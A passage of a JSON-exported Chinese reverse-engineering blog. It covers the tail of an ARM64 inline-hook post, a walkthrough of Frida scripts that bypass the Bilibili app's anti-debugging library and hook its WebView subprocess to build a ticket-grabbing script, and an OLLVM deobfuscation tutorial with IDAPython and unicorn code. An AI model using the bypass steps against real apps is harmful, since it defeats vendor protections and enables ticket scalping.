X16HOOK_MAIN_FUNC_ADDR:_hook_main_func_addr_: .dword 0x1234567812345678HOOK_FINISH_RETURN_ADDR:_hook_finish_return_addr_: .dword 0x1234567812345678_shellcode_end_:# 执行 hook 逻辑 这里我们的 hook 逻辑很简单，就是打印调用函数 strlen 之后 X0 的值 void hook_main(u_long sp)&#123; LOGD(\"enter hook main!\"); //sp -- sp+0x10 存储的是 NZCV 寄存器，从 sp+0x10 开始才是 x0-x31 的位置 u_long strlen_ret_value = *(u_long*)(sp+0x10); LOGD(\"hook done! target function strlen return value is 0x%08lx\",strlen_ret_value);&#125;终于现在我们也可以自己完成一次简单的 hook 了！ 完整代码已经传到 github 上面啦 https://github.com/oacia/inlinehook_demo # 参考资料 Mac 中：用 lldb 调试安卓 app 进程 【工具使用】Android 调试利器之 LLDB Android LLDB debugging 使用 GDB、LLDB 调试安卓程序 [原创] Frida inlineHook 原理分析及简单设计一款 AArch64 inlineHook 工具 Android 下实现 ptrace 注入 &amp; hook 使用 ptrace 向已运行进程中注入.so 并执行相关函数 Android 注入要点记录","categories":[],"tags":[]},{"title":"b站app漫展抢票","slug":"bilibili-get-ticket","date":"2024-07-13T10:14:21.000Z","updated":"2025-04-08T18:55:11.457Z","comments":true,"path":"bilibili-get-ticket/","link":"","permalink":"https://oacia.dev/bilibili-get-ticket/","excerpt":"","text":"# 前言 最近萌生了想去漫展的想法，毕竟这么久了还没有去过一次漫展嘞，听说 cp30 好像不错，不过问题就是票特别的难抢😔 趁现在 cp30 买票还没开始，今天也没有什么其他的事情，所以就简单分析了一下 b 站的 app，写了个抢票脚本自娱自乐一下 感觉这个 app 还是很有意思的，它把主要的 webview 业务逻辑放到子进程里运行我觉得还是很不错滴，这样 frida 注入到主进程就 hook 不到了（我就被卡了快一个小时！） 但这个抢票脚本写的相当的简陋，我就不好意思放出来啦😂不过相信大家在 github 上应该可以找到更加完善的项目吧 :) 还有就是为什么不直接去 b 站会员购网页端分析呢，这样购票接口不是一下子就看到了嘛就不需要绕各种检测了 just for fun! # 基本信息 包名: tv.danmaku.bili 入口: tv.danmaku.bili.MainActivityV2 # frida 反调试 先看看会员购页面是哪一个 activity 的 PS D:\\work\\analysis\\bilibili> adb shell \"dumpsys activity top | grep ACTIVITY\" ACTIVITY com.google.android.apps.nexuslauncher/.NexusLauncherActivity ad36d3f pid=2139 ACTIVITY tv.danmaku.bili/.MainActivityV2 e753a0a pid=12505用 frida 写个简单的 hook 脚本注入进去看看情况 function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"com.mall.ui.page.base.MallWebFragmentLoaderActivity\"); activity.onCreate.overload('android.os.Bundle').implementation = function(x)&#123; const retv = this.onCreate(x); return retv; &#125; &#125;)&#125;setImmediate(hook,0);oriole:/data/local/tmp # /data/local/tmp/fs16.3.3 -l 0.0.0.0:1234adb forward tcp:1234 tcp:1234frida -H 127.0.0.1:1234 -l .\\hook.js -f tv.danmaku.bili注入进去之后不出意料的卡在主界面不动了 去看看是在哪一个 so 卡住的 function hook_dlopen() &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); console.log(\"load \" + path); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen)哈哈没想到是 libmsaoaidsec.so , 这个 so 我在很多的 apk 里面都看到过了，按照以前逆向的经验这个 so 里面没有任何的业务代码，在 init_proc 里面是纯的检测逻辑 我对 libmsaoaidsec.so 里面的控制流平坦化还是很感兴趣的，之后会去专门分析一下这个 so:) 现在我们就用最简单的方法去反调试好啦，就是不让 app 加载这个 so, 具体做法就是在打开这个 so 时，把要加载的 so 的字符串置空 function hook_dlopen() &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if(path.indexOf('libmsaoaidsec.so') >= 0)&#123; ptr(pathptr).writeUtf8String(\"\"); &#125; console.log(\"load \" + path); &#125; &#125; &#125;);&#125;setImmediate(hook_dlopen_anti)再次注入代码之后就 hook 成功了 # webview chrome 调试 用 Device Monitor 看一下购票的页面，发现是套了一个 WebView 想要在 android 中使用 chrome 的 devtool 开启 webview debug, 需要注入下面的 frida 脚本 function webview_debug() &#123; Java.perform(function () &#123; var WebView = Java.use('android.webkit.WebView'); WebView.$init.overloads.forEach(function(init) &#123; init.implementation = function() &#123; // 调用原始构造方法 var instance = init.apply(this, arguments); // 打开 WebView 的调试功能 WebView.setWebContentsDebuggingEnabled(true); console.log('[*] WebView debug open~'); // 返回实例 return instance; &#125;; &#125;); &#125;);&#125;然后使用 USB 将电脑和手机相连 在电脑端的 chrome 打开 chrome://inspect/#devices 之后我们点击这个 Port forwarding 按钮配置端口转发 然后 选一个端口点击 Done 但是这样做并没有什么网页可以 inspect 通过 device monitor 来看，这个 b 站肯定是调用了 Webview 的，那为什么这个脚本没有 hook 到 Webview 的创建呢？我觉得可能的原因就是 webview 并不是在主进程被创建的，而是在子进程被创建的，我们打印一下 bilibili 建立的进程来看看情况 的确，除了主进程之外，还多了其他的四个进程，感觉这个 web 进程很可疑呀 那写个 python 脚本让 frida 也去注入这个 tv.danmaku.bili:web 子进程好啦 import codecsimport fridaimport sysimport threadingdevice = frida.get_device_manager().add_remote_device(\"127.0.0.1:1234\")pending = []sessions = []scripts = []event = threading.Event()jscode = open('./hook.js', 'r', encoding='utf-8').read()pkg = \"tv.danmaku.bili\" #包名def spawn_added(spawn): event.set() if spawn.identifier == pkg or spawn.identifier == f\"&#123;pkg&#125;:web\": print('spawn_added:', spawn) session = device.attach(spawn.pid) script = session.create_script(jscode) script.on('message', on_message) script.load() device.resume(spawn.pid)def spawn_removed(spawn): print('spawn_removed:', spawn) event.set()def on_message(spawn, message, data): print('on_message:', spawn, message, data)def on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)device.on('spawn-added', spawn_added)device.on('spawn-removed', spawn_removed)device.enable_spawn_gating()event = threading.Event()print('Enabled spawn gating')pid = device.spawn([pkg])session = device.attach(pid)print(\"[*] Attach Application id:\", pid)device.resume(pid)sys.stdin.read()这样就 hook 到子进程啦 打开了 webview 的 debug 之后，终于可以 inspect 了！ 之后的过程就很简单啦 点击漫展详情，抓个包 点击立即购票，抓个包 点击提交订单，抓个包 我写了一个小脚本还挺好用的，用这个 js 脚本可以读取剪切板里的 curl 请求并转换为 python 的 request 请求复制到剪切板上 :) 剪切板里的 curl 请求是从这里来的 记得安装一下包就好了 npm i curlconverternpm i copy-pasteimport * as curlconverter from 'curlconverter';import ncp from 'copy-paste'let cmd = ncp.paste()var res = curlconverter.toPython(cmd);console.log(res)ncp.copy(res, function () &#123; console.log(\"OK\")&#125;)分析一下接口，写一下脚本就抢票成功啦 waiting for cp30!","categories":[],"tags":[]},{"title":"ollvm三种混淆模式的反混淆思路","slug":"ollvm-study","date":"2024-07-12T01:24:52.000Z","updated":"2025-04-09T15:00:45.630Z","comments":true,"path":"ollvm-study/","link":"","permalink":"https://oacia.dev/ollvm-study/","excerpt":"","text":"ollvm 算是日常逆向的过程中的一个难点，试想一下当你把程序拖进 ida 后那无穷无尽的 block 出现在面前的感受，这滋味一言难尽呐… 所以很有必要对 ollvm 的混淆与反混淆进行系统的学习，以便在未来实际生活中遇到时，不必慌忙的去 google 寻找答案. 文中的分析所用到的附件可以点这里下载哦 ollvm_bcf-fla-sub.zip # 预备知识 llvm 是一个完整的编译器架构，作用可以理解为制作一个编译器，llvm 先将源码生成为与目标机器无关的 LLVM IR 代码，然后把 LLVMIR 代码先优化，再向目标机器的汇编语言而努力。经典编译器都可以分为前端、中层优化和后端： 从上图中可以看到 clang 是前端的一个套件，但在实际使用时，我们只可以感受到 clang，也只是在使用 clang，因为编译的时候，是调用 clang 或 clang++ 来编译源码。 而 ollvm 是基于 LLVM 的代码分支的代码混淆，在中间表示 IR 层，通过编写 pass（遍历一遍 IR，可以同时对它做一些操作）来混淆 IR，这样目标机器的汇编语言也就被混淆了 # ollvm 环境搭建 ollvm 搭建的环境为 ubuntu22.04 # 下载 ollvm 4.0 源码 git clone -b llvm-4.0 --depth=1 https://github.com/obfuscator-llvm/obfuscator.git# 安装 docker sudo apt install docker.io# 安装编译 ollvm 的 docker 环境 sudo docker pull nickdiego/ollvm-build# 编译 ollvm # 下载编译脚本 git clone --depth=1 https://github.com/oacia/docker-ollvm.git# 编译 ollvm-build.sh 后面跟的参数是 ollvm的源码目录 sudo docker-ollvm/ollvm-build.sh /home/oacia/Desktop/obfuscator/# 创建硬链接 sudo ln ./obfuscator/build_release/bin/* /usr/bin/创建完成硬链接后，使用该命令来检测 clang 是否可用 clang --version# 使用测试代码尝试编译 使用一个简单的 RC4 加密来作为测试代码， 该代码将在后续 ollvm 的三种混淆中继续使用 //test.c#include&lt;stdio.h>/*RC4 初始化函数*/void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)&#123; int i = 0, j = 0; char k[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i &lt; 256; i++) &#123; s[i] = i; k[i] = key[i % Len_k]; &#125; for (i = 0; i &lt; 256; i++) &#123; j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; &#125;&#125;/*RC4 加解密函数unsigned char* Data 加解密的数据unsigned long Len_D 加解密数据的长度unsigned char* key 密钥unsigned long Len_k 密钥长度*/void RC4(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) // 加解密&#123; unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k &lt; Len_D; k++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; &#125;&#125;void RC4encrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;void RC4decrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;int main()&#123; // 字符串密钥 unsigned char key[] = \"secret\"; unsigned long key_len = sizeof(key) - 1;// 字符串最后还有一个 '/0' 所以需要 - 1 // 数组密钥 //unsigned char key[] = &#123;'s','e','c','r','e','t'&#125;; //unsigned long key_len = sizeof(key); unsigned char data[] = &#123; 116, 104, 105, 115, 32, 105, 115, 32, 82, 67, 52, 44, 111, 97, 99, 105, 97 &#125;; // 对明文进行加密 RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%d, \", data[i]); &#125; printf(\"\\n\"); // 对密文进行解密 RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%c\", data[i]); &#125; printf(\"\\n\"); return 0;&#125;/*153, 94, 187, 111, 162, 205, 165, 134, 96, 136, 143, 240, 156, 135, 150, 94, 204,this is RC4,oacia*/运行如下命令进行编译 clang test.c -o test 如果提示 fatal error: ‘stdio.h’ file not found ​ 尝试下载 g++ 和 gcc sudo apt-get install g++sudo apt-get install gcc 如果提示 fatal error: 'stddef.h’或者’stdarg.h’等 file not found 使用该命令复制 clang 所需的头文件到 /usr/include/ , cp -r -i 后面跟的参数为 ollvm的源码目录/build_release/lib/clang/4.0.1/include/. , 这个文件夹内包含了 clang 编译器所需的头文件 cp -r -i /home/oacia/Desktop/obfuscator/build_release/lib/clang/4.0.1/include/. /usr/include/如果提示有重名文件的话，最好先对 /usr/include 内的重名文件作好备份，然后去掉 -i 参数重新进行复制头文件操作 # 虚假控制流 BCF (Bogus Control Flow) # 原理 虚假控制流混淆通过加入包含不透明谓词的条件跳转（也就是跳转与否在运行之前就已经确定的跳转，但 IDA 无法分析）和不可达的基本块，来干扰 IDA 的控制流分析和 F5 反汇编。 所谓的不透明谓词，例如 if(x>10 &amp;&amp; x&lt;=10)&#123; goto Label1;&#125;对于这类表达式，我们可以很明显的看到， x&gt;10 &amp;&amp; x&lt;=10 是永假式，所以 goto Label1 这个跳转永远不会被执行，但是对于 IDA 来说可不是这个样子，在静态分析的时候，IDA 并不知道 x 的值是多少，所以说这类虚假控制流就会干扰我们的静态分析. # ollvm 的 BCF 混淆 使用下列命令对代码进行 BCF 混淆 clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 test.c -o test-bcf可用选项： -mllvm -bcf : 激活虚假控制流 -mllvm -bcf_loop=3 : 混淆次数，这里一个函数会被混淆 3 次，默认为 1 -mllvm -bcf_prob=40 : 每个基本块被混淆的概率，这里每个基本块被混淆的概率为 40%，默认为 30 % 可以发现在 BCF 混淆之后，函数的控制流明显复杂了许多 打开 BCF 混淆之后 IDA 的伪代码，发现多了许多的 while , if 表达式，伪代码变得十分复杂，也让我们无法一眼就可以看出这是何种加密 # ollvm 的 BCF 反混淆 铺垫了这么长的时间，终于要来到本篇文章的第一个有趣的环节，BCF 的反混淆了 我们往上看 while 内的表达式 y_4 &gt;= 10 &amp;&amp; (((x_3 - 1) * x_3) &amp; 1) != 0 , 在这个式子中， (x_3 - 1) * x_3) 的值永远为偶数，所以 (x_3 - 1) * x_3) &amp; 1 永远返回 0 , 不等号左边 y_4 &gt;= 10 &amp;&amp; (((x_3 - 1) * x_3) &amp; 1) , 因为是用逻辑与 &amp;&amp; 作为连接词，所以左侧的表达式其实为永假式， y_4 &gt;= 10 &amp;&amp; (((x_3 - 1) * x_3) &amp; 1) != 0 永远不成立 对于 BCF, 有 3 种思路可以帮助我们去进行反混淆 # 思路一 将全局变量赋值并将 segment 设为只读 IDA 其实是有死代码消除 (DCE, Dead Code Elimination) 的，但是由于 y_4 , x_3 被定义为了全局变量，在静态分析时，IDA 不知道这个表达式的值是多少，所以 IDA 也不敢轻易的就把这段代码给消除了 (万一把重要的代码也给消除掉了那逆向人员真的要 *** 了) 但是如果我们把这个变量的值定下来，并且将变量所在的 segment 设为 只读 ，那这个变量值在没运行前也变不了，IDA 不就可以自己算出来这个表达式的值是多少了嘛，这样那些没有用的跳转 IDA 就可以自动优化了 所以我们先双击 x_3 跳转到 x_3 的地址 然后按下 Alt+S 或者 Edit-&gt;Segments-&gt;Edit segment... 来改变不透明谓词所在的 segment 的读写属性，如图将 Write 复选框取消勾选， .bss段 就设为只读了 光是这样还不够，因为 .bss段 中的变量还没有被赋过值，所以我们还需要 patch 这个段来固定 .bss段 内变量的值 一个变量一个变量去 patch 显然显得有些麻烦，所以我们可以直接编写 IDApython 脚本来实现一步到位的效果，并且对于常规的 ollvm 的 bcf 混淆来说，bcf 的不透明谓词都是处于 .bss段 中。如果不透明谓词定义在其他段中，将 IDApython 中的代码做出相对应的修改即可 import ida_segmentimport ida_bytesseg = ida_segment.get_segm_by_name('.bss')for ea in range(seg.start_ea, seg.end_ea,4): ida_bytes.patch_bytes(ea, int(2).to_bytes(4,'little'))'''seg.perm: 由三位二进制数表示,例如一个segment为可读,不可写,不可执行,则seg.perm = 0b100(seg.perm >> 2)&amp;1: Read(seg.perm >> 1)&amp;1: Write(seg.perm >> 0)&amp;1: Execute'''seg.perm = 0b100# 思路二 使用 d810 去除 BCF d810 中内置了很多的不透明谓词表达式，它的匹配器也是非常的厉害完全可以做到去除虚假控制流 在 Edit-&gt;plugins-&gt;D-810 打开之后，选择 default_unflattening_switch_case.json 之后点击 start , 即可做到对不透明谓词的去除并还原控制流 还原后的效果如下，可以发现和原本的代码基本是一样的了 当然如果发现有一些恒定值的不透明谓词表达式 d810 没有识别到无法去除的话，我们也可以手动添加规则让 D810 进行匹配来消除 BCF 例如对于这个表达式 ((x_0&gt;=10 &amp;&amp; x_10&lt;10)==false) == True , 我们可以先在 \\plugins\\d810\\conf\\xxx.json 里面添加我们自己的规则 随后来到 plugins\\d810\\optimizers\\instructions\\pattern_matching\\rewrite_and.py 中加一个我们自己的类 OaciaRule0 , 这样就可以完成一个自定义规则的导入啦 # 思路三 使用 idapython patch 不透明谓词 在思路一中，我们通过对不透明谓词变量进行交叉引用找到了它们所在的 segment, 并通过将全局变量赋值并将 segment 设为只读的方法消除了 BCF, 但是其实我们还可以用另外的一种方式去消除 bcf, 就是在汇编中将不透明谓词直接 patch 掉 例如对于该不透明谓词 x_9 , y_10 , 它的 c 表达式为 y_10 &gt;= 10 &amp;&amp; ((((_BYTE)x_9 - 1) * (_BYTE)x_9) &amp; 1) != 0 我们要做的就是让 mov eax, ds:x_9 改成 mov eax, 0 , 这样就可以做到消除 BCF 的目的 但是这样一个一个改过去显得十分的麻烦，所以我们可以用 ida python, 通过找到不透明谓词的所有交叉引用的方式来批量修改 # 去除虚假控制流 idapython 脚本import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytes # 将 mov 寄存器，不透明谓词 修改为 mov 寄存器，0def do_patch(ea): if get_bytes(ea, 1) == b\"\\x8B\": # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) >> 3 patch_bytes(ea, (0xB8 + reg).to_bytes(1,'little') + b'\\x00\\x00\\x00\\x00\\x90\\x90') else: print('error') # 不透明谓词在.bss 段的范围seg = ida_segment.get_segm_by_name('.bss')start = seg.start_eaend = seg.end_ea for addr in range(start,end,4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,'-')) # 获取所有交叉引用 while(ref != ida_idaapi.BADADDR): do_patch(ref) print('patch at ' + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print('-' * 20)这样 BCF 就被去掉啦 # 指令替换（SUB） # 原理 指令替换（Instruction Substitution）是一种代码混淆技术，用于将程序中的原始指令替换为等效但更难理解和还原的指令序列。通过指令替换，可以增加程序的复杂性和抵抗逆向工程的能力。 它的本质其实就是数学公式的简化，例如 (x + y) - 2 * (x &amp; y) -&gt; x ^ y (过去学离散数学感觉做的就是这种样子的…) # ollvm 的 SUB 混淆 使用下面的命令对代码进行 SUB 混淆 clang -mllvm -sub -mllvm -sub_loop=3 test-sub.c -o test-sub可用选项 -mllvm -sub : 激活指令替换 -mllvm -sub_loop=3 : 混淆次数，这里一个函数会被混淆 3 次，默认为 1 次 经过指令替换后，代码明显变长了很多 # ollvm 的 SUB 反混淆 # 思路一 使用 d810 去除 SUB D810 太猛了！这里又用到了 D810 还是和去除 BCF 反混淆一样，我们直接跑一下 d810, 虽然还是有一些部分没有去掉，但是看起来已经很清晰了，因为指令替换不影响程序整体的执行逻辑，所以我想剩下的一点点 SUB 应该难不倒逆向的同学吧～ # 思路二 使用 GAMBA 简化复杂的 SUB 表达式 这个思路二其实就是思路一那一点点未解决的 SUB 的补充，对于一些复杂的表达式来说，github 上的开源工具 GAMBA 可以很好的帮助我们简化 具体可以参考细品 sec2023 安卓赛题中的 加密三 vm 指令分析 # 控制流平坦化（FLA） # 原理 控制流平坦化 (control flow flattening) 的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，例如下图是正常的执行流程 经过控制流平坦化后的执行流程就如下图 这样可以模糊基本块之间的前后关系 此图是一个经典的控制流平坦化 CFG 其中 序言：函数的第一个执行的基本块 主 (子) 分发器：控制程序跳转到下一个待执行的基本块 retn 块：函数出口 真实块：混淆前的基本块，程序真正执行工作的块 预处理器：跳转到主分发器 # ollvm 的 FLA 混淆 使用如下命令即可完成 fla 混淆 clang -mllvm -fla -mllvm -split -mllvm -split_num=3 test-fla.c -o test-fla可用选项： -mllvm -fla : 激活控制流平坦化 -mllvm -split : 激活基本块分割 -mllvm -split_num=3 : 指定基本块分割的数目 经过控制流平坦化之后，函数的逻辑已经很难看清楚了 # ollvm 的 FLA 反混淆 想要定位各个块其实很简单，对于经典的 ollvm 来说，各个块之间有如下规则 (要是魔改的话就具体情况具体分析啦) 找到序言块，这是整个函数的入口 序言块的后继是主分发器 主分发器的前驱有两个，除了序言块外，另一个块就是预处理器 预处理器的前驱是真实块 除此之外的其他块是子分发器 想要反控制流平坦化，我们只需要做 3 步 找到真实块。我们可以手动找真实块；可以用 idapython 通过各个块之间的联系通过一定的规则找真实块；可以用 unicorn 或 angr 得到函数的 CFG, 利用规则匹配出真实块… 方法多种多样，但是核心都是找到真实块，除真实块和序言块外，其余的块都是虚假块，我们需要 NOP 掉他们 得到真实块之间的联系。我们主要想知道分支跳转的另一个分支，它究竟跳到了什么地方去的呢？所以这一步我们必须得让代码运行起来，它把控制流给混淆了，我们要是不把代码跑起来咋知道控制流嘞？可以用模拟执行，也可以在真机调试打断点 trace, 核心都是为了找到真实块之间的调用关系 得到了真实块之间的联系之后，我们只需要在每个真实块的末尾，用跳转汇编指令将每个真实块像串糖葫芦一样串起来，控制流平坦化就修复好啦～ 所以开始我们的第一步找到真实块和虚假块，对于标准的 ollvm 来说，观察得知预处理器的前驱都是真实块，所以我们写出如下的 idapython 脚本 import idaapiimport idctarget_func = 0x401E80#需要反控制流平坦化的函数的地址Preprocessor_block = 0x402697#ollvm 中预处理器的地址，这个是通过观察 ida 中的 CFG 得到的，预处理器的前驱都是真实块True_blocks = []#真实块列表Fake_blocks = []#所有块的列表f_block = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)for block in f_block: if block.start_ea==Preprocessor_block:#预处理器块的前驱都是真实块 #but 预处理器是虚假块 Fake_blocks.append((block.start_ea,idc.prev_head(block.end_ea))) print(\"find ture block!\") tbs = block.preds() for tb in tbs: #print (hex (tb.start_ea),hex (idc.prev_head (tb.end_ea)))# 获取块的开始 / 结束地址 True_blocks.append((tb.start_ea,idc.prev_head(tb.end_ea))) elif not [x for x in block.succs()]:#返回块没有后继 print(\"find ret block!\") True_blocks.append((block.start_ea,idc.prev_head(block.end_ea))) # 序言块不作为虚假块处理 elif block.start_ea!=target_func: #print(hex(block.start_ea),hex(idc.prev_head(block.end_ea))) Fake_blocks.append((block.start_ea,idc.prev_head(block.end_ea)))print('true block:')print('tbs =',True_blocks)print('fake block:')print('fbs =',Fake_blocks)之后就是要得到真实块之间的联系啦，这里我使用 unicorn 来模拟执行得到真实块的调用关系，这里要注意的是因为我们只对一个函数中真实块的前后调用进行模拟执行，所以是不需要跳转到其他函数中的，遇到 call 指令直接将 pc 强制改成下一行汇编的地址，同时也要注意内存访问异常的情况直接通过 uc.hook_add(UC_HOOK_MEM_UNMAPPED|UC_HOOK_INTR, hook_mem_access) 进行忽略 通过这个 unicorn 脚本模拟执行，我们得到了分支跳转时下一个要跳转的真实块地址，以及此时的 ZF 标志位，这个标志位可是有着大用，通过这个标志位我们就可以知道究竟是 jz 跳转还是 jnz 跳转啦 # code for test-fla.elffrom unicorn import *from unicorn.x86_const import *from keystone import * # pip install keystone-enginefrom capstone import * # pip install capstone# import networkx as nx #pip install networkx# import matplotlib.pyplot as plt # pip install matplotlibBASE = 0x400000CODE = BASE + 0x0CODE_SIZE = 0x100000STACK = 0x7F00000000STACK_SIZE = 0x100000FS = 0x7FF0000000FS_SIZE = 0x100000ks = Ks(KS_ARCH_X86, KS_MODE_64) # 汇编引擎uc = Uc(UC_ARCH_X86, UC_MODE_64) # 模拟执行引擎cs = Cs(CS_ARCH_X86, CS_MODE_64) # 反汇编引擎# g=nx.Graph ()# 创建空的无向图# g=nx.DiGraph ()# 创建空的有向图tbs = [(4204176, 4204182), (4203066, 4203066), (4203071, 4203098), (4203103, 4203157), (4203162, 4203314), (4203319, 4203341), (4203346, 4203366), (4203371, 4203398), (4203403, 4203428), (4203433, 4203457), (4203462, 4203490), (4203495, 4203514), (4203519, 4203558), (4203563, 4203585), (4203590, 4203609), (4203614, 4203636), (4203641, 4203651), (4203656, 4203689), (4203694, 4203737), (4203742, 4203776), (4203781, 4203804), (4203809, 4203831), (4203836, 4203856), (4203861, 4203888), (4203893, 4203918), (4203923, 4203957), (4203962, 4203981), (4203986, 4204025), (4204030, 4204040), (4204045, 4204067), (4204072, 4204091), (4204096, 4204118), (4204123, 4204133), (4204138, 4204171)]tb_call = []main_addr = 0x00000000000401E80main_end = 0x0000000000040269Cdef hook_code(uc: unicorn.Uc, address, size, user_data): # print(hex(address)) for i in cs.disasm(CODE_DATA[address - BASE:address - BASE + size], address): if i.mnemonic == \"call\": # 因为只是针对单个函数的控制流，所以我们并不需要跳转到其他的函数里面 print(f\"find call at &#123;hex(address)&#125;, jump...\") uc.reg_write(UC_X86_REG_RIP, address + size) elif i.mnemonic == \"ret\": print(\"find ret block, emu stop~\") uc.emu_stop() print(\"block emu path↓↓↓↓\") print(tb_call) # for i in range(len(tb_call)-1): # g.add_edge(tb_call[i],tb_call[i+1]) # Plot it # nx.draw(g, with_labels=True) # nx.write_gml(g,'./test-fla.gml') for tb in tbs: if address == tb[1]: # print (uc.reg_read (UC_X86_REG_FLAGS))#ZF 标志位在第 6 位 ZF_flag = (uc.reg_read(UC_X86_REG_FLAGS) &amp; 0b1000000) >> 6 #print(\"ZF=\", ZF_flag) tb_call.append((tb, ZF_flag)) breakdef hook_mem_access(uc: unicorn.Uc, type, address, size, value, userdata): pc = uc.reg_read(UC_X86_REG_RSP) # UC_ARM64_REG_PC print('pc:%x type:%d addr:%x size:%x' % (pc, type, address, size)) # uc.emu_stop() return Truedef inituc(uc): uc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL) uc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL) uc.mem_write(CODE, CODE_DATA) uc.reg_write(UC_X86_REG_RSP, STACK + 0x1000) uc.hook_add(UC_HOOK_CODE, hook_code) uc.hook_add(UC_HOOK_MEM_UNMAPPED | UC_HOOK_INTR, hook_mem_access)def init_graph(): for tb in tbs: g.add_node(tb[1])with open('./test-fla', 'rb') as f: CODE_DATA = f.read()inituc(uc)try: uc.emu_start(main_addr, main_end)except Exception as e: print(e)之后再去写一个 idapython 脚本将真实块串起来就可以啦，对于无分支跳转，可以直接将前后基本块通过 jmp 进行连接，而麻烦的只是分支跳转，我们由模拟执行后已经得到了分支跳转时的 ZF 标志位，通过该标志位我们将将 jmp 改成为零跳转 (jz) 亦或是非零跳转 (jnz) 写一下 patch 脚本，修复成功～ import idaapiimport ida_bytesimport idcfrom keystone import *ks = Ks(KS_ARCH_X86, KS_MODE_64) # 汇编引擎def jmp_patch(start, target, j_code=\"jmp\"): global debug patch_byte, count = ks.asm(f\"&#123;j_code&#125; &#123;hex(target)&#125;\", addr=start) patch_byte = bytes(patch_byte) + b'\\x00' * (idc.get_item_size(start) - len(patch_byte)) print(hex(start), f\"&#123;j_code&#125; &#123;hex(target)&#125;\", patch_byte) ida_bytes.patch_bytes(start, patch_byte)def patch_nop(addr, endaddr): #print(f\"Patching from &#123;addr&#125; to &#123;endaddr&#125;\") while addr &lt; endaddr: ida_bytes.patch_byte(addr, 0x90) addr += 1def patch_nop_line(addr): patch_nop(addr,addr+idc.get_item_size(addr))preamble_block = 0x401E8B # 序言块的地址internal_reg = '[rbp+var_B4]'#中间变量的名称，遇到这个想都不用想直接 NOP# 格式: ((块的起始地址，块的结束地址),ZF 标志位)tb_path = [((4203071, 4203098), 0), ((4203103, 4203157), 0), ((4203162, 4203314), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), 